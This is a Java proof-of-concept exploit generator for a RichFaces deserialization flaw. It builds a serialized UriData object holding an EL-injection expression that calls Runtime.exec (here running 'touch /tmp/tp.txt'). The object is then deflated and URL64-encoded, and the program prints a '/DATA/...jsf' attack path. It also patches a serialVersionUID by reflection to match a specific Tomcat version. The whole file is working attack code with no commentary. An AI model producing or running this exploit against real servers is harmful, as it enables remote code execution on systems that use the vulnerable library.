import com.sun.facelets.el.TagMethodExpression;
import com.sun.facelets.el.TagValueExpression;
import com.sun.facelets.tag.Location;
import com.sun.facelets.tag.TagAttribute;
import org.ajax4jsf.resource.UserResource;
import org.ajax4jsf.util.base64.URL64Codec;
import org.jboss.el.MethodExpressionImpl;
import org.jboss.el.ValueExpressionImpl;
import org.jboss.el.parser.*;
import org.jboss.seam.core.Expressions;
import org.richfaces.ui.application.StateMethodExpressionWrapper;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Date;
import java.util.zip.Deflater;
import javax.el.MethodExpression;
import javax.faces.context.FacesContext;

public  class  Main  {

    public static void main(String[] args) throws Exception{

        String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\" touch /tmp/tp.txt\")}";
       // tomcat8.5.24 MethodExpression serialVersionUID
        Long MethodExpressionSerialVersionUID = -5607040308862307186L;
        Class clazz = Class.forName("javax.el.MethodExpression");
        Field field = clazz.getDeclaredField("serialVersionUID");
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        field.setLong(null, MethodExpressionSerialVersionUID);




        // createContent
        MethodExpressionImpl mei = new MethodExpressionImpl(pocEL, null, null, null, null, new Class[]{OutputStream.class, Object.class});
        ValueExpressionImpl vei = new ValueExpressionImpl(pocEL, null, null, null, MethodExpression.class);
        StateMethodExpressionWrapper smew = new StateMethodExpressionWrapper(mei, vei);
        Location location = new Location("/richfaces/mediaOutput/examples/jpegSample.xhtml", 0, 0);
        TagAttribute tagAttribute = new TagAttribute(location, "", "", "@11214", "createContent="+pocEL);
        TagMethodExpression tagMethodExpression = new TagMethodExpression(tagAttribute, smew);

        Class cls = Class.forName("javax.faces.component.StateHolderSaver");
        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
        ct.setAccessible(true);
        Object createContnet = ct.newInstance(null, tagMethodExpression);

        //value
        Object value = "haveTest";

        //modified
        TagAttribute tag = new TagAttribute(location, "", "", "just", "modified="+pocEL);
        ValueExpressionImpl ve = new ValueExpressionImpl(pocEL+" modified", null, null, null, Date.class);
        TagValueExpression tagValueExpression = new TagValueExpression(tag, ve);
        Object modified = ct.newInstance(null, tagValueExpression);

        //expires
        TagAttribute tag2 = new TagAttribute(location, "", "", "have_fun", "expires="+pocEL);
        ValueExpressionImpl ve2 = new ValueExpressionImpl(pocEL+" expires", null, null, null, Date.class);
        TagValueExpression tagValueExpression2 = new TagValueExpression(tag2, ve2);
        Object expires = ct.newInstance(null, tagValueExpression2);

        //payload object
        UserResource.UriData uriData = new UserResource.UriData();
        //Constructor con = UserResource.class.getConstructor(new Class[]{});
        Field fieldCreateContent = uriData.getClass().getDeclaredField("createContent");
        fieldCreateContent.setAccessible(true);
        fieldCreateContent.set(uriData, createContnet);
        Field fieldValue = uriData.getClass().getDeclaredField("value");
        fieldValue.setAccessible(true);
        fieldValue.set(uriData, value);
        Field fieldModefied = uriData.getClass().getDeclaredField("modified");
        fieldModefied.setAccessible(true);
        fieldModefied.set(uriData, modified);
        Field fieldExpires = uriData.getClass().getDeclaredField("expires");
        fieldExpires.setAccessible(true);
        fieldExpires.set(uriData, expires);


        //encrypt
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(uriData);
        objectOutputStream.flush();
        objectOutputStream.close();
        byteArrayOutputStream.close();
        byte[] pocData = byteArrayOutputStream.toByteArray();
        Deflater compressor = new Deflater(1);
        byte[] compressed = new byte[pocData.length + 100];
        compressor.setInput(pocData);
        compressor.finish();
        int totalOut = compressor.deflate(compressed);
        byte[] zipsrc = new byte[totalOut];
        System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
        compressor.end();
        byte[] dataArray = URL64Codec.encodeBase64(zipsrc);

        String poc = "/DATA/" + new String(dataArray, "ISO-8859-1") + ".jsf";
        System.out.println(poc);
    }
}